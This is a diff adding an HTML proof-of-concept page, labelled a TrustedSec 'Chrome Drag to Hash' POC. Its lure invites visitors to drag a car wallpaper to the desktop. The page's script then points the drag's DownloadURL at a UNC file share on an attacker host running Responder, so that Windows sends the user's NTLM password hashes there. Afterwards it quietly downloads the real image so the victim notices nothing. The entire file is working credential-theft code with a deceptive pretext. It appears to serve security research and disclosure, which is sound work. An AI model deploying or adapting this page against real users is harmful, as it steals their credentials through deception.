@@ -1,0 +1,54 @@
+<html>
+<head>
+	<title>TrustedSec POC</title>
+</head>
+<body>
+	<h1>TrustedSec Chrome Drag to Hash POC</h1>
+
+	<h2>Epic Desktop Wallpaper for car lovers!</h2>
+	<i>Drag the image to your desktop to save the wallpaper!</i>
+	<br><br>
+
+	<img id="dragimg" src="/dragRacer.jpg"
+	draggable="true"
+	style="cursor: grab;">
+
+	<script type="text/javascript">
+		let dragging = false;
+
+		const element = document.getElementById('dragimg');
+
+		element.addEventListener('dragstart', (e) => {
+			dragging = true;
+
+			// This is the magic that points to our Responder hoping to snag hashes
+			e.dataTransfer.setData("DownloadURL", `image/png:dragRacer.jpg:file://10.211.55.9/SHARE/dragRacer.jpg`);
+
+			console.log("Dragging image file!");
+		});
+
+
+		window.addEventListener('focus', () => {
+			if (dragging)
+			{
+				console.log("Mouse has returned after dragging!");
+				dragging = false;
+
+				fetch('/dragRacer.jpg')
+				.then(res => res.blob())
+				.then(blob => {
+					const url = URL.createObjectURL(blob);
+					const a = document.createElement('a');
+					a.href = url;
+					a.download = 'dragRacer.jpg';
+					document.body.appendChild(a);
+					a.click();
+					document.body.removeChild(a);
+					URL.revokeObjectURL(url);
+				});
+			}
+		});
+
+	</script>
+</body>
+</html>
